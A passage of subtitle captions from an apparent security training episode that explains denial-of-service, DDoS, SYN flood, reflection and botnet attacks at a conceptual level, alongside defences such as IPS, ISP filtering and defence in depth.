right?\n\n15\n00:00:46.343 --> 00:00:48.350\nI'm gonna go fight it out with somebody.\n\n16\n00:00:48.350 --> 00:00:51.912\nI'm gonna try to steal their\nability to be able to perform, and\n\n17\n00:00:51.912 --> 00:00:56.013\ndo the things they wanna do from them,\nby sucking resources, or sucking\n\n18\n00:00:56.013 --> 00:01:00.538\nthe ability to be able to provide access\nto resources out of the system, right?\n\n19\n00:01:00.538 --> 00:01:02.430\nAnd that's really what we\nthink about denial of service.\n\n20\n00:01:02.430 --> 00:01:05.290\nWhen we think about distributed\ndenial of service, what we call DDoS.\n\n21\n00:01:05.290 --> 00:01:07.610\nAnd we'll talk about this as well.\n\n22\n00:01:07.610 --> 00:01:10.110\nWe think about that just propagated and\nmultiplied.\n\n23\n00:01:10.110 --> 00:01:13.541\nSo it's not a one on one, but\nit's essentially a gang fight, right.\n\n24\n00:01:13.541 --> 00:01:16.039\nIt's a group of people trying\nto attack one machine, or\n\n25\n00:01:16.039 --> 00:01:19.020\na group of machines trying\nto attack another machine.\n\n26\n00:01:19.020 --> 00:01:21.000\nAnd so the goal here, right,\n\n27\n00:01:21.000 --> 00:01:24.560\nis to understand what it is that\nthe attacker is looking to do.\n\n28\n00:01:24.560 --> 00:01:29.193\nIs it a single kind of a lone wolf\nattacker taking us on one on one, right?\n\n29\n00:01:29.193 --> 00:01:33.526\nMano-a-mano as they say, sock on sock,\nI had to work that in somewhere, right?\n\n30\n00:01:33.526 --> 00:01:37.537\nOr is it gonna be a group of,\nor a collection of machines,\n\n31\n00:01:37.537 --> 00:01:40.976\noften referred to as a botnet,\nor a zombie army.\n\n32\n00:01:40.976 --> 00:01:43.155\nThere's different ways you\nhear this referred to.\n\n33\n00:01:43.155 --> 00:01:47.786\nMachines that have been taken over, have\nsomehow been either captured and have been\n\n34\n00:01:47.786 --> 00:01:52.370\nthrough the application of malware,\ncommand and control to attack a machine.\n\n35\n00:01:52.370 --> 00:01:54.103\nOr have been built specifically and\n\n36\n00:01:54.103 --> 00:01:57.059\npurposefully to then become\nessentially an attack vector.\n\n37\n00:01:57.059 --> 00:02:00.688\nA lot of times we hear about DoS and\nDDoS systems when we hear about bots and\n\n38\n00:02:00.688 --> 00:02:02.129\nbotnets and all this stuff.\n\n39\n00:02:02.129 --> 00:02:04.694\nAnd we hear about the fact that malware,\n\n40\n00:02:04.694 --> 00:02:09.524\nas we talked about in the sniffing\ndiscussions we had in prior episodes, and\n\n41\n00:02:09.524 --> 00:02:14.217\nin the malware episodes as well,\nis used to spread this kind of an attack.\n\n42\n00:02:14.217 --> 00:02:17.712\nBut we don't often think about, and\ndon't often acknowledge the fact that\n\n43\n00:02:17.712 --> 00:02:21.380\nmany bot armies were built simply\nspecifically, right, to go out and attack.\n\n44\n00:02:21.380 --> 00:02:25.170\nSo with the advent of virtualization\ntoday, the advent of the cloud,\n\n45\n00:02:25.170 --> 00:02:30.215\nwith cloning and templating, as a standard\nway of deploying systems today,\n\n46\n00:02:30.215 --> 00:02:33.835\nand software defining and\nautomating much of what we do.\n\n47\n00:02:33.835 --> 00:02:37.969\nWe have the ability to very quickly spin\nup iterations of these operating systems\n\n48\n00:02:37.969 --> 00:02:38.713\nif we need to.\n\n49\n00:02:38.713 --> 00:02:41.930\nAnd we don't necessarily have to go out\nand get a whole bunch of machines and\n\n50\n00:02:41.930 --> 00:02:44.435\ntake them over,\nwe can simply create our own.\n\n51\n00:02:44.435 --> 00:02:49.037\nAnd so as a result, it's becoming very,\nvery easy to into the hey, I wanna go in\n\n52\n00:02:49.037 --> 00:02:53.950\nand execute a DoS or DDoS attack, and even\nbuild my own army or essentially rent one.\n\n53\n00:02:53.950 --> 00:02:56.731\nAnd I don't necessarily have to\ngo over and take, or go out and\n\n54\n00:02:56.731 --> 00:02:58.510\ntake over machines in order to do that.\n\n55\n00:02:58.510 --> 00:03:01.460\nSo just keep that in mind as just one\nof the general thought processes.\n\n56\n00:03:01.460 --> 00:03:06.230\nBut reducing, restricting, or somehow\nimpacting our ability to use resources,\n\n57\n00:03:06.230 --> 00:03:09.950\nrendering systems unavailable or\ncompromised in such a way that they cannot\n\n58\n00:03:09.950 --> 00:03:13.840\nrespond, is what denial or\ndistributed denial of service does.\n\n59\n00:03:13.840 --> 00:03:16.400\nDistributed denial of service,\nmultitude or\n\n60\n00:03:16.400 --> 00:03:20.667\nmassive amounts of systems attacking one,\ndenial of service, a one on one,\n\n61\n00:03:20.667 --> 00:03:23.830\nkind of a single,\na fight it out to the death kinda thing.\n\n62\n00:03:23.830 --> 00:03:26.350\nSo we just wanna think about that.\n\n63\n00:03:26.350 --> 00:03:27.930\nWhen we think about these attacks,\n\n64\n00:03:27.930 --> 00:03:30.980\nwe often have to think about the different\nways in which they propagate.\n\n65\n00:03:32.240 --> 00:03:36.070\nWhen you go out on the web, and\nwe go to all sorts of websites both for\n\n66\n00:03:36.070 --> 00:03:37.180\nour shows here.\n\n67\n00:03:37.180 --> 00:03:41.080\nMike's always been really good about\ntrying to put up resource items for\n\n68\n00:03:41.080 --> 00:03:43.400\nyou in the chat window, and\nI say hey what about this software?\n\n69\n00:03:43.400 --> 00:03:44.780\nGo here, do that.\n\n70\n00:03:44.780 --> 00:03:46.560\nHe'll go out and he'll find it for us.\n\n71\n00:03:46.560 --> 00:03:49.700\nAnd I know he does his best to\nmake sure the URLs are safe, and\n\n72\n00:03:49.700 --> 00:03:52.480\nobviously there's no backside or\ndownside to that.\n\n73\n00:03:52.480 --> 00:03:55.950\nBut we really if you think about it truly,\nwe just don't really know\n\n74\n00:03:55.950 --> 00:03:59.090\nwhat we're getting ourselves into\nby going out on the web today.\n\n75\n00:03:59.090 --> 00:04:00.845\nAnd as a result of that, more and\n\n76\n00:04:00.845 --> 00:04:03.716\nmore drive by attacks\nare becoming very prevalent.\n\n77\n00:04:03.716 --> 00:04:06.371\nYou essentially stop at\na website to get something, and\n\n78\n00:04:06.371 --> 00:04:10.280\nthere's malware lurking there, either in\na zero frame or an IFrame of some sort.\n\n79\n00:04:10.280 --> 00:04:13.150\nOr there potentially is a redirect,\na masquerade or\n\n80\n00:04:13.150 --> 00:04:15.990\na spoof, we spoke about this in\nthe sniffing attacks a little bit, and\n\n81\n00:04:15.990 --> 00:04:18.450\nthe discussion around them\nin the prior episodes.\n\n82\n00:04:18.450 --> 00:04:21.510\nWe may have through DNS\nresolver cache poisoning,\n\n83\n00:04:21.510 --> 00:04:25.050\nARP cache poisoning as we said,\nthe ability to redirect attacks or\n\n84\n00:04:25.050 --> 00:04:29.380\nrather redirect people coming in through\nan attack to a different website.\n\n85\n00:04:29.380 --> 00:04:32.798\nSo bandwidth attacks can be used to\npropagate denial of service attacks,\n\n86\n00:04:32.798 --> 00:04:35.390\nflood attacks, SYN floods,\nthings like that.\n\n87\n00:04:35.390 --> 00:04:40.074\nICMP floods, pings, ping of death for\ninstance, right, an oldie but goody.\n\n88\n00:04:40.074 --> 00:04:42.980\nWe can do men in the middle attacks,\nspoofing, masquerading.\n\n89\n00:04:42.980 --> 00:04:45.390\nAny or all of these things\ncan potentially lead to this.\n\n90\n00:04:45.390 --> 00:04:49.980\nPeer to peer file sharing systems,\nBitTorrent, things like that are known\n\n91\n00:04:49.980 --> 00:04:53.270\nunfortunately for being able to give\nout software and all sorts of stuff.\n\n92\n00:04:53.270 --> 00:04:56.660\nBut they also distribute malware\nunfortunately, and can be the site and\n\n93\n00:04:56.660 --> 00:04:58.370\nsource of attacks as well.\n\n94\n00:04:58.370 --> 00:05:01.620\nSo we have to think about that,\nand obviously understand that.\n\n95\n00:05:01.620 --> 00:05:04.700\nApplication level attacks can\nbe used to flood our system.\n\n96\n00:05:04.700 --> 00:05:08.130\nSo we talked about SYN floods and\nMAC flooding, and\n\n97\n00:05:08.130 --> 00:05:12.750\nthings like that on the switches for\ninstance, and the ability to be able to\n\n98\n00:05:12.750 --> 00:05:17.830\nfail a switch open, as opposed to failing\nit in a secure way as we had talked about.\n\n99\n00:05:17.830 --> 00:05:21.398\nAnd so, there are a lot of\ndifferent concerns we have here.\n\n100\n00:05:21.398 --> 00:05:24.748\nThere could be what's called a permanent\ndenial of service attack condition,\n\n101\n00:05:24.748 --> 00:05:28.020\nwhere a system is damaged beyond repair,\ntaken offline potentially.\n\n102\n00:05:28.020 --> 00:05:31.980\nThis may involve physical as\nwell as other kinds of attacks.\n\n103\n00:05:31.980 --> 00:05:37.010\nSustained, long-term, high levels of\nbandwidth attacks that can occur,\n\n104\n00:05:37.010 --> 00:05:40.510\nthat are just relentless because they're\nautomated, can be problematic, and so\n\n105\n00:05:40.510 --> 00:05:41.690\nwe have to think about that.\n\n106\n00:05:41.690 --> 00:05:46.360\nReflection attacks can also occur, and\nthese are things where you will go ahead\n\n107\n00:05:46.360 --> 00:05:51.580\nand we will as a distributed event, have\na whole array of systems that are set up,\n\n108\n00:05:51.580 --> 00:05:55.950\nand we say okay, everybody ping this\ntarget or SYN flood this target.\n\n109\n00:05:55.950 --> 00:05:59.340\nAnd everybody sends traffic inbound,\nand ultimately as a result,\n\n110\n00:05:59.340 --> 00:06:02.260\neverybody hits this one machine and\ntakes it offline, because we send\n\n111\n00:06:02.260 --> 00:06:05.080\nthe packets out to everybody, and then\nthey all respond to the target machine.\n\n112\n00:06:05.080 --> 00:06:06.340\nAnd they don't respond to me,\n\n113\n00:06:06.340 --> 00:06:09.440\nthey respond essentially to\nwhoever I wanna take offline.\n\n114\n00:06:09.440 --> 00:06:10.890\nSo we call that a reflection attack.\n\n115\n00:06:10.890 --> 00:06:13.670\nSo there's lots of\ndifferent ways to do this.\n\n116\n00:06:13.670 --> 00:06:16.890\nThere are things literally like DoS\nin a box or DDoS in a box today,\n\n117\n00:06:16.890 --> 00:06:21.670\nwhere you can go out on the dark areas\nof the web, the Metasploit framework for\n\n118\n00:06:21.670 --> 00:06:24.280\ninstance can be used for this,\nif you know what you're doing.\n\n119\n00:06:24.280 --> 00:06:28.140\nOther versions of hacking frameworks can\nbe used, where you can actually create\n\n120\n00:06:28.140 --> 00:06:32.020\nthe attack code and propagate it, and\nset it up, and just have it running.\n\n121\n00:06:32.020 --> 00:06:35.250\nIt can be like a calendared event like\nanything else, like I'll set my coffee pot\n\n122\n00:06:35.250 --> 00:06:38.380\nfor 7 o'clock in the morning, and I'll\nset a DoS attack to go off at 7:10, so\n\n123\n00:06:38.380 --> 00:06:42.100\nI can watch it while I'm\nsipping my espresso.\n\n124\n00:06:42.100 --> 00:06:45.020\nThis is the kind of stuff that happens,\nand it happens quite frequently.\n\n125\n00:06:45.020 --> 00:06:46.758\nSo we do have to think about this.\n\n126\n00:06:46.758 --> 00:06:50.832\nWhen we see denial, or distributed\ndenial of service attacks taking place,\n\n127\n00:06:50.832 --> 00:06:54.910\nwe have to think about the fact that\nthey are essentially resource starvation\n\n128\n00:06:54.910 --> 00:06:56.850\nattacks in one form or another.\n\n129\n00:06:56.850 --> 00:07:01.090\nAnd we have to understand that whatever\nthe vector, the pathway if you will, or\n\n130\n00:07:01.090 --> 00:07:05.310\nthe mechanism being used to propagate\nthe attack is, if we can find that,\n\n131\n00:07:05.310 --> 00:07:09.010\nif we can validate that, if we can zero\nin on it, and we can stop or redirect it,\n\n132\n00:07:09.010 --> 00:07:10.900\nwe may be able to prevent the attack.\n\n133\n00:07:10.900 --> 00:07:15.510\nThis gets into the idea of using IDS,\nIPS technology, more so IPS but\n\n134\n00:07:15.510 --> 00:07:16.715\ncertainly both.\n\n135\n00:07:16.715 --> 00:07:20.517\nI mentioned this in one of the prior\nepisodes when we talked about how switches\n\n136\n00:07:20.517 --> 00:07:24.493\nbehave, and what I would potentially do to\ntry to figure out how to secure a switch\n\n137\n00:07:24.493 --> 00:07:26.080\nif it was gonna fail over.\n\n138\n00:07:26.080 --> 00:07:28.550\nI talked about stepping back with\nthis question that Mike posed,\n\n139\n00:07:28.550 --> 00:07:31.270\nwhich is a great one, about hey,\nhow does that switch work?\n\n140\n00:07:31.270 --> 00:07:33.950\nAnd can we actually program it to do that?\n\n141\n00:07:33.950 --> 00:07:36.014\nAnd we actually did check offline,\nby the way.\n\n142\n00:07:36.014 --> 00:07:37.634\n&gt;&gt; We did.\n&gt;&gt; You were there.\n\n143\n00:07:37.634 --> 00:07:40.996\nWe talked about it with a couple\nof our in-house Cisco gurus, and\n\n144\n00:07:40.996 --> 00:07:44.782\nwe did hit on the answer, which was a kind\nof a combination of what I said and\n\n145\n00:07:44.782 --> 00:07:46.930\nwhat I theorized would happen.\n\n146\n00:07:46.930 --> 00:07:51.374\nDAI, which I had mentioned,\nthe Dynamic ARP Inspection Solution, or\n\n147\n00:07:51.374 --> 00:07:52.938\nDARPI [LAUGH] that we had.\n\n148\n00:07:52.938 --> 00:07:56.778\nAnd when that is set up, actually\ndoes include this kinda bandwidth and\n\n149\n00:07:56.778 --> 00:07:59.982\nrate throttling that takes\nplace to slow down the inbound.\n\n150\n00:07:59.982 --> 00:08:02.761\nTransmission a packet can\noverwhelm the switch, so\n\n151\n00:08:02.761 --> 00:08:05.560\nit does automatically try to control for\nthat.\n\n152\n00:08:05.560 --> 00:08:08.830\nThere is another control\ncommand in the iOS and\n\n153\n00:08:08.830 --> 00:08:11.180\nearlier versions that\napparently would be supported.\n\n154\n00:08:11.180 --> 00:08:14.970\nI believe still from what we understand\nthat could do the separately, but\n\n155\n00:08:14.970 --> 00:08:16.410\nit's really not used much anymore.\n\n156\n00:08:16.410 --> 00:08:18.360\nBecause most of the modern switches and\n\n157\n00:08:18.360 --> 00:08:22.320\nthe modern systems will support\nthings like Dynamic ARP Inspection.\n\n158\n00:08:22.320 --> 00:08:25.600\nAnd as a result, do automatically kick\ninto a throttled condition, right?\n\n159\n00:08:25.600 --> 00:08:28.920\nWhere they will slow down the inbound\ntraffic into the buffers and\n\n160\n00:08:28.920 --> 00:08:31.670\ntry to control what's\ngoing into the CAM table.\n\n161\n00:08:31.670 --> 00:08:34.160\nBut if you are able to still\noverwhelm the switch and\n\n162\n00:08:34.160 --> 00:08:37.370\nwith enough inbound traffic you can,\nthe switch does still fail.\n\n163\n00:08:37.370 --> 00:08:40.420\nAnd ultimately when it does as\nI indicated, it fails open.\n\n164\n00:08:40.420 --> 00:08:43.500\nSo there's really no good way to\npresuppose that would happen and\n\n165\n00:08:43.500 --> 00:08:44.500\ntry to prevent it.\n\n166\n00:08:44.500 --> 00:08:46.920\nBecause as I indicated,\nwith an error condition,\n\n167\n00:08:46.920 --> 00:08:48.530\nif you get to that point on the switch,\nright?\n\n168\n00:08:48.530 --> 00:08:52.830\nAnd it does fail, you may not be able to\nexecute the switch configuration properly.\n\n169\n00:08:52.830 --> 00:08:55.342\nTo essentially change\nthe behavior by flushing,\n\n170\n00:08:55.342 --> 00:08:59.420\ncuz you would have to flush the buffers or\nflush the cache and reset the CAM table.\n\n171\n00:08:59.420 --> 00:09:03.590\nAnd as I said, best way to do that would\nbe essentially to power cycle the switch.\n\n172\n00:09:03.590 --> 00:09:07.060\nI indicated that I would step out back\nseveral layers in the architecture.\n\n173\n00:09:07.060 --> 00:09:10.090\nAnd I would approach it from\ndoing something like using an IPS\n\n174\n00:09:10.090 --> 00:09:12.440\nmonitoring solution to maybe reach out.\n\n175\n00:09:12.440 --> 00:09:15.790\nAnd to reset that switch\nas part of an action\n\n176\n00:09:15.790 --> 00:09:19.760\nbased on inbound traffic management and\ndoing the actual monitoring.\n\n177\n00:09:19.760 --> 00:09:22.760\nAnd what I would just wanted to circle\nback to and point out here was not so\n\n178\n00:09:22.760 --> 00:09:23.650\nmuch of that story.\n\n179\n00:09:23.650 --> 00:09:25.090\nThat's part of the discussion,\n\n180\n00:09:25.090 --> 00:09:28.410\nit's good to know that, it's good that\nwe understand that we can do that.\n\n181\n00:09:28.410 --> 00:09:31.670\nBut here with DOS and DDOS,\nreally reinforcing for\n\n182\n00:09:31.670 --> 00:09:35.125\nyou the idea of using these\nother scale technologies.\n\n183\n00:09:35.125 --> 00:09:38.460\nIPS' that stand on the border,\nthat are looking at inbound and\n\n184\n00:09:38.460 --> 00:09:39.910\noutbound traffic for us.\n\n185\n00:09:39.910 --> 00:09:43.745\nLooking for pattern matches and\nlooking for suspicious behavior.\n\n186\n00:09:43.745 --> 00:09:48.195\nAnd then can remediate and take steps\nto essentially cut off inbound traffic\n\n187\n00:09:48.195 --> 00:09:52.405\nflows if required are gonna be important\nfor us to consider and to think about.\n\n188\n00:09:52.405 --> 00:09:55.460\nSo we do wanna be aware of that and\njust have that in mind.\n\n189\n00:09:55.460 --> 00:09:59.140\nWe also wanna keep in mind that if\nwe can identify the source, right?\n\n190\n00:09:59.140 --> 00:10:02.950\nThe initialization point of the attack,\nwe may be able to work with our ISP\n\n191\n00:10:02.950 --> 00:10:05.270\npotentially if it's\nexternal to our networks.\n\n192\n00:10:05.270 --> 00:10:08.900\nSo we can have them redirect or cut off\nthis inbound traffic flow that may be able\n\n193\n00:10:08.900 --> 00:10:11.510\nto blacklist one or more IP addresses.\n\n194\n00:10:11.510 --> 00:10:15.358\nThey may be able to redirect or\nreroute traffic or filter it upstream.\n\n195\n00:10:15.358 --> 00:10:19.120\nSo there's a lot of ways to deal with this\nand things that we wanna be aware of.\n\n196\n00:10:19.120 --> 00:10:23.410\nThere's all these different solutions that\nwe really should not be overwhelmed by,\n\n197\n00:10:23.410 --> 00:10:25.840\nbut rather should be picking and\nchoosing from.\n\n198\n00:10:25.840 --> 00:10:29.626\nTo ensure that we have the best possible\nset of solutions at our fingertips,\n\n199\n00:10:29.626 --> 00:10:31.588\nessentially tools that we can deploy.\n\n200\n00:10:31.588 --> 00:10:35.831\nYou have smart architecture, good design,\nplanning to be successful in the face\n\n201\n00:10:35.831 --> 00:10:38.610\nof adversity is how we survive\nthese kind of attacks.\n\n202\n00:10:38.610 --> 00:10:40.727\nAnd when we're dealing with SYN floods or\n\n203\n00:10:40.727 --> 00:10:43.500\nwe're dealing with any of\nthese kinds of issues.\n\n204\n00:10:43.500 --> 00:10:47.330\nWe wanna make sure that we have more\nthan one defensive mechanism that we've\n\n205\n00:10:47.330 --> 00:10:47.830\nplanned on.\n\n206\n00:10:47.830 --> 00:10:50.640\nWe don't wanna just in other words,\nrely on a single\n\n207\n00:10:50.640 --> 00:10:53.380\nsolution that's gonna be the difference\nbetween success and failure.\n\n208\n00:10:53.380 --> 00:10:57.830\nWe talked about this defense in depth or\nlayered approach that I often speak about.\n\n209\n00:10:57.830 --> 00:11:00.368\nWhere we have multiple systems\nbacking up one another,\n\n210\n00:11:00.368 --> 00:11:02.660\ncounter-measure after counter-measure.\n\n211\n00:11:02.660 --> 00:11:04.380\nPreventative, detective, corrective,\n\n212\n00:11:04.380 --> 00:11:07.070\ndeterrent, base controls\nin different categories.\n\n213\n00:11:07.070 --> 00:11:09.990\nAnd we wanna be able to do those\nthings because we know in theory and\n\n214\n00:11:09.990 --> 00:11:11.120\nin all actuality.\n\n215\n00:11:11.120 --> 00:11:15.070\nPractically, that one or more of these\ncontrols may fail and if they do, right,\n\n216\n00:11:15.070 --> 00:11:17.490\nwe wanna have a backup to our backup.\n\n217\n00:11:17.490 --> 00:11:20.600\nWe don't wanna be stuck with a single\npoint of failure in other words, right?\n\n218\n00:11:20.600 --> 00:11:22.370\nThat's gonna be a really bad thing.\n\n219\n00:11:22.370 --> 00:11:24.680\nSo we have to think about that and\nunderstand that.\n\n220\n00:11:24.680 --> 00:11:28.620\nAnd we also need to know and again,\nthis is something that from a kind of\n\n221\n00:11:28.620 --> 00:11:32.230\na cultural, a thought process perspective,\na if you will.\n\n222\n00:11:32.230 --> 00:11:34.730\nMentally being prepared to\nplay the game perspective.\n\n223\n00:11:34.730 --> 00:11:37.970\nSo this is put on your\nsecurity gameface time, right?\n\n224\n00:11:37.970 --> 00:11:42.380\nYou have to understand that sometimes\nit requires the ability for you,\n\n225\n00:11:42.380 --> 00:11:45.560\nfrom you as a defender to\nthink outside the box.\n\n226\n00:11:45.560 --> 00:11:47.600\nTo be able to get inside of\nthe head of the attacker and\n\n227\n00:11:47.600 --> 00:11:50.140\nfigure out what's going on and\nstop these attacks.\n\n228\n00:11:50.140 --> 00:11:53.330\nYet we often hear in movies and\na lot of times you see this on TV shows.\n\n229\n00:11:53.330 --> 00:11:57.370\nIf we eliminate all of the obvious things,\nthe only thing left however improbable,\n\n230\n00:11:57.370 --> 00:12:00.700\nno matter what it may be is actually\nmore often than not the answer.\n\n231\n00:12:00.700 --> 00:12:04.690\nAnd sometimes it's that crazy wacky\nscenario that nobody envisions and\n\n232\n00:12:04.690 --> 00:12:06.360\nactually is what's taking place.\n\n233\n00:12:06.360 --> 00:12:08.773\nBecause somebody has thought, well,\nwhat's the best way to attack this system?\n\n234\n00:12:08.773 --> 00:12:12.000\nThey're never gonna see it coming,\nlet me do it this way, right?\n\n235\n00:12:12.000 --> 00:12:14.620\nLet me take over a machine\ninside the network.\n\n236\n00:12:14.620 --> 00:12:17.155\nLet me use that as a thing so\nthey'll look inside.\n\n237\n00:12:17.155 --> 00:12:18.467\nThey won't watch the border and\n\n238\n00:12:18.467 --> 00:12:22.250\nthen let me attack through a weak point\nthat I found or a back door or vice-versa.\n\n239\n00:12:22.250 --> 00:12:26.365\nLet me use the backdoor as a faint, let me\nzombie or bot a bunch of machines inside.\n\n240\n00:12:26.365 --> 00:12:30.087\nAnd the minute they're kind of over\nhere fighting the fire on the border,\n\n241\n00:12:30.087 --> 00:12:33.040\nI'm gonna come over here and\nturn on these 30 machines.\n\n242\n00:12:33.040 --> 00:12:36.600\nThat I'm gonna nail that server and\ntake down the network from the inside.\n\n243\n00:12:36.600 --> 00:12:40.310\nI've seen all sorts of crazy\nthings happen over the years\n\n244\n00:12:40.310 --> 00:12:43.970\nas we've either done instant response or\ndealt with issues and concerns.\n\n245\n00:12:43.970 --> 00:12:47.570\nOr just been on one or more teams that\nhave had to do this, either for real or\n\n246\n00:12:47.570 --> 00:12:48.920\nin simulations.\n\n247\n00:12:48.920 --> 00:12:52.350\nAnd you wanna understand that\nnothing is off the table.\n\n248\n00:12:52.350 --> 00:12:55.340\nThe attackers are gonna try any and\nevery mechanism, any and\n\n249\n00:12:55.340 --> 00:12:57.880\nevery approach possible to gain advantage.\n\n250\n00:12:57.880 --> 00:13:00.830\nIf you fight fairly,\nthen you fight to lose is what we often\n\n251\n00:13:00.830 --> 00:13:03.080\nsay when we talk about\ninformation security.\n\n252\n00:13:03.080 --> 00:13:04.780\nBecause being honorable and\n\n253\n00:13:04.780 --> 00:13:07.760\nfighting fairly is great when\neverybody's on the same page, right?\n\n254\n00:13:07.760 --> 00:13:11.410\nAnd everybody agrees that [INAUDIBLE]\nrules, so what we're gonna do-\n\n255\n00:13:11.410 --> 00:13:13.250\n&gt;&gt; Three steps, you turn, then fire.\n\n256\n00:13:13.250 --> 00:13:14.170\n&gt;&gt; Right.\n\n257\n00:13:14.170 --> 00:13:17.551\nWe're never gonna be that person who says,\nokay, the minute your back, right,\n\n258\n00:13:17.551 --> 00:13:19.882\nI'm jumping you and\nit's a street fight, right?\n\n259\n00:13:19.882 --> 00:13:22.850\nI mean if it's a street fight,\nthere are no rules, right?\n\n260\n00:13:22.850 --> 00:13:24.729\nAnd in a knock down drag\nout with an attacker,\n\n261\n00:13:24.729 --> 00:13:27.261\nthey're gonna do everything\nthey can to gain an advantage.\n\n262\n00:13:27.261 --> 00:13:30.208\nAnd you've gotta understand that\nwhether you want to act ethically and\n\n263\n00:13:30.208 --> 00:13:33.360\nhonestly, I'm not suggesting you\nbreak the law, let me be clear.\n\n264\n00:13:33.360 --> 00:13:35.400\nThere are definitive areas and\n\n265\n00:13:35.400 --> 00:13:38.795\ndefined boundaries you do not\ncross even to defend your network.\n\n266\n00:13:38.795 --> 00:13:41.450\nWe've talked about the fact\nyou don't go active and\n\n267\n00:13:41.450 --> 00:13:44.600\noffensively try to take\nsomebody on to stop an attack.\n\n268\n00:13:44.600 --> 00:13:46.550\nBecause that's really not a good idea.\n\n269\n00:13:46.550 --> 00:13:49.290\nYou're gonna get them and\nall their friends with all their, right,\n\n270\n00:13:49.290 --> 00:13:51.730\nattack vectors on you number one.\n\n271\n00:13:51.730 --> 00:13:54.320\nAnd number two, you can be breaking laws.\n\n272\n00:13:54.320 --> 00:13:57.040\nEven though they may be breaking a law,\nyou turning around and\n\n273\n00:13:57.040 --> 00:13:58.900\nattacking them is also violating the law.\n\n274\n00:13:58.900 --> 00:14:01.980\nAnd you may be held liable even\nthough they started it, right?\n\n275\n00:14:01.980 --> 00:14:04.230\nAnd so that is not gonna work.\n\n276\n00:14:04.230 --> 00:14:07.380\nAt that point you've gotta cut your\nlosses, cut the cable literally.\n\n277\n00:14:07.380 --> 00:14:10.900\nIf nothing else works, cut yourself\noff from the outside world and\n\n278\n00:14:10.900 --> 00:14:13.160\nthen lick your wounds and\nlive to fight another day.\n\n279\n00:14:13.160 --> 00:14:15.130\nBut you may need to get\nlaw enforcement involved,\n\n280\n00:14:15.130 --> 00:14:16.870\nyou may need to deal with your ISP.\n\n281\n00:14:16.870 --> 00:14:19.320\nThere are avenues that you have to pursue.\n\n282\n00:14:19.320 --> 00:14:20.890\nBut you can fight dirty and\n\n283\n00:14:20.890 --> 00:14:24.468\nstill fight ethically in\nthe sense of not breaking the law.\n\n284\n00:14:24.468 --> 00:14:28.094\nAnd there's nothing wrong with trying\nto do everything you can to defend your\n\n285\n00:14:28.094 --> 00:14:31.445\nnetwork to a point, but\nyou have to understand what that point is.\n\n286\n00:14:31.445 --> 00:14:35.229\nAnd so, we wanna understand things like\nSYN attacks, wanna understand SYNflooding,\n\n287\n00:14:35.229 --> 00:14:37.320\nwe've talked about this attack before.\n\n288\n00:14:37.320 --> 00:14:43.120\nGoing in and overwhelming a system by\nsetting up essentially invalid three\n\n289\n00:14:43.120 --> 00:14:46.660\nway handshakes by starting the process\noff, but then never finishing it, right?\n\n290\n00:14:46.660 --> 00:14:47.930\nAnd every time we do that and\n\n291\n00:14:47.930 --> 00:14:51.430\nwe extend the SYN packet to\nestablish the connection, right?\n\n292\n00:14:52.550 --> 00:14:55.074\nThe propagation coming\nback should be SYN ACK.\n\n293\n00:14:55.074 --> 00:14:57.810\nAcknowledge my SYN and\nsend to SYN on the other side, so\n\n294\n00:14:57.810 --> 00:15:01.010\nI can do the ACK and we then have\nestablished it through the handshake.\n\n295\n00:15:01.010 --> 00:15:03.900\nIf we don't do that, but\nwe establish the SYM request,\n\n296\n00:15:03.900 --> 00:15:06.570\nthe receiving machine has\nto keep resources open.\n\n297\n00:15:06.570 --> 00:15:10.670\nTo append to that request until it either\ntimes out or it is resolved, right,\n\n298\n00:15:10.670 --> 00:15:12.650\nand it is actually taken off.\n\n299\n00:15:12.650 --> 00:15:16.040\nIf we do enough of that quickly enough,\nthen we can actually overwhelm the system.\n\n300\n00:15:16.040 --> 00:15:19.340\nThis is just buffer overflows and\na variety of mechanism.\n\n301\n00:15:19.340 --> 00:15:22.130\nICMP flood attacks with\ncenturies overwhelm\n\n302\n00:15:22.130 --> 00:15:26.320\nthe system with a very large number\nof ICMP attacks were propagating.\n\n303\n00:15:26.320 --> 00:15:29.490\nUnrestricted pings against the system\nuntil we overwhelm its ability\n\n304\n00:15:29.490 --> 00:15:30.320\nto deal with that.\n\n305\n00:15:30.320 --> 00:15:34.390\nMost modern network systems or most\nmodern OS' has been patched against this.\n\n306\n00:15:34.390 --> 00:15:36.570\nPing of Death is not as\nbig of a deal anymore.\n\n307\n00:15:36.570 --> 00:15:39.938\nIt did affect Unix,\nLinux machines predominantly, but\n\n308\n00:15:39.938 --> 00:15:43.529\nwe do really see that being kind\nof very low on the totem pole.\n\n309\n00:15:43.529 --> 00:15:46.692\nPeer to peer attacks, where we have\npeer to peer file sharing networks and\n\n310\n00:15:46.692 --> 00:15:48.028\nwe're propagating malware.\n\n311\n00:15:48.028 --> 00:15:50.060\nThis is how all sorts\nof crazy stuff starts.\n\n312\n00:15:50.060 --> 00:15:52.744\nWe talked about permanent denial\nservice attacks physically.\n\n313\n00:15:52.744 --> 00:15:57.514\nRendering systems incapable of working,\napplication level flooding attacks\n\n314\n00:15:57.514 --> 00:16:01.715\nwhere we use application floods or\nflood applications with seemingly\n\n315\n00:16:01.715 --> 00:16:06.500\nlegitimate traffic again to kind of suck\naway resources and take them offline.\n\n316\n00:16:06.500 --> 00:16:08.070\nThis is what we're attempting to do.\n\n317\n00:16:08.070 --> 00:16:12.190\nLoss of service, bad code that's\nbeing exploited because it's weak.\n\n318\n00:16:12.190 --> 00:16:15.620\nOne of the biggest things we can do to\ndefend against these kind of attacks is\n\n319\n00:16:15.620 --> 00:16:19.970\nsource code validation and code review, to\nfind bugs and weaknesses in the code and\n\n320\n00:16:19.970 --> 00:16:20.980\nthan remediate them.\n\n321\n00:16:20.980 --> 00:16:23.460\nThis is one of the big things\nthat we often overlook and\n\n322\n00:16:23.460 --> 00:16:26.600\nwe dont work unfortunately well enough and\n\n323\n00:16:26.600 --> 00:16:30.280\ncarefully enough with programmers\nto ensure they program securely.\n\n324\n00:16:30.280 --> 00:16:33.232\nAnd if we did get them to write better\ncode we would eliminate a lot of\n\n325\n00:16:33.232 --> 00:16:34.990\nthese weaknesses more often than not.\n\n326\n00:16:34.990 --> 00:16:38.686\nSomething else to consider,\nwe do have distributed reflection or\n\n327\n00:16:38.686 --> 00:16:43.306\nreflective denial service of attacks what\nare call DRDoS or as somebody once said to\n\n328\n00:16:43.306 --> 00:16:47.332\nme Doctor DoS attacks, which in theory\ntechnically is not incorrect but\n\n329\n00:16:47.332 --> 00:16:49.780\nit's capital DRD lowercase o, capital S.\n\n330\n00:16:49.780 --> 00:16:53.440\nBut DR, distributed or\nDistribution Reflection 